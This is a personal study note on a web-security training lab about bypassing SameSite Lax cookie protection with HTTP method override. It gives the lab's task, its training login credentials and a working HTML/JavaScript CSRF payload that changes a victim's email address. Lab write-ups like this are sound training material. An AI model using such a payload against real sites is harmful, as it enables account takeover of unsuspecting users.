---
title: "Lab: SameSite Lax bypass via method override"
aliases:
  - "Lab SameSite Lax bypass via method override"
kind: lab
tags:
  - vulnerabilities
  - lab
area: "Vulnerabilities"
up: "[[CSRF]]"
notion-id: 232759b92751826d9c9f8121fe081bd0
---

# Lab: SameSite Lax bypass via method override

In: [[Career]] / [[Vulnerabilities]] / [[CSRF]]

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

![[attachments/Vulnerabilities/CSRF/Lab - SameSite Lax bypass via method override/image.png]]

![[attachments/Vulnerabilities/CSRF/Lab - SameSite Lax bypass via method override/image 1.png]]

![[attachments/Vulnerabilities/CSRF/Lab - SameSite Lax bypass via method override/image 2.png]]

![[attachments/Vulnerabilities/CSRF/Lab - SameSite Lax bypass via method override/image 3.png]]

```html
<html>
  <body>
    <script>
      document.location = "https://0a3300c7044178038029300600a000cb.web-security-academy.net/my-account/change-email?email=doo@web-security-academy.net&_method=POST"
    </script>
  </body>
</html>
```
